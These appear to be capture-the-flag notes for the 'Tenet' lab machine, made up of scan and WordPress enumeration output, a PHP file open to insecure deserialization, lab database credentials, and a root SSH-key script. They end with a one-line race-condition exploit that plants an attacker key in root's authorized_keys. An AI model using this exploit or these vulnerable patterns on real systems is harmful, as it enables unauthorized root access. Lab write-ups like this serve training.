# **Notes For Tenet**
# FOOTHOLD
## Nmap Scan Results
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

## Gobuster Results
```bash
http://10.10.10.223/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.223/wordpress/]
http://10.10.10.223/server-status        (Status: 403) [Size: 277]
```

## Wpscan Results
```bash
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tenet.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tenet.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://tenet.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tenet.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Outdated, released on 2020-12-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://tenet.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.6</generator>
 |  - http://tenet.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://tenet.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://tenet.htb/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | Style URL: http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://tenet.htb/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://tenet.htb/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://tenet.htb/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.7 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tenet.htb/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tenet.htb/wp-content/plugins/akismet/readme.txt
 
[i] User(s) Identified:

[+] protagonist
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] neil
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

## sator.php is vulnerable to deserialization attack
```php
class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
```

### Interesting
Rotas time-management software
Neil mentioned sator.php and a backup file

# User Flag
## Contents of wp-config.php
```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
```

# Root Flag
## Contents of enableSSH.sh
```bash
#!/bin/bash

checkAdded() {
	sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
		/bin/echo "Successfully added $sshName to authorized_keys file!"
	else
		/bin/echo "Error in adding $sshName to authorized_keys file!"
	fi
}

checkFile() {
	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
		/bin/echo "Error in creating key file!"
		if [[ -f $1 ]]; then /bin/rm $1; fi
		exit 1
	fi
}

addKey() {
	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
	(umask 110; touch $tmpName)
	/bin/echo $key >>$tmpName
	checkFile $tmpName
	/bin/cat $tmpName >>/root/.ssh/authorized_keys
	/bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

## Exploit
```bash
while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCzPnJYCgXephd1xWZlRoUxoMxw9p1cdcd7+b0ifwsPLGeLs1yhUZEfe7IOc6tnNwQSbToiG4DmmtopfHyXwO8ephuSSKoKT08YTd1OGNgK5ti6KnmZiSibR4IMMj+pMU9s95nOB0olodpEeh3/HdhrHyN1cP9d5rjKfRk0pXIs4/23ft3pgsuKEIFGO9addveaK3DPEzqeJP7N6SoejR4yhGIVvBza7J9m88MohgosvhT4zmR9pqhDYXQ5vbRTvMqPSPBuZwXuopBtDj3n9nMs7m5kpC++TECoeA8kXykf1iVuwKqRrf9noDiyOX1Y6afnIXvmHzRyQ1LbeZWu36ARW2MtlnY49+cy/N2t/1iannXAvn/GYbDrl5Af9EyxkHRIbLIONd8L+XvqTO7haKg3MAg9kp2YAcbcKcpSHuNzR1tZpzp59ujc2+qAxBRsNjzgs0tyWgOMlZhDOcoGtRPEqmjW+PCFG2M38hmyTDxIrGIpbforL4b0zxP+9wxiTE= root@fsociety" | tee /tmp/ssh* > /dev/null; done
```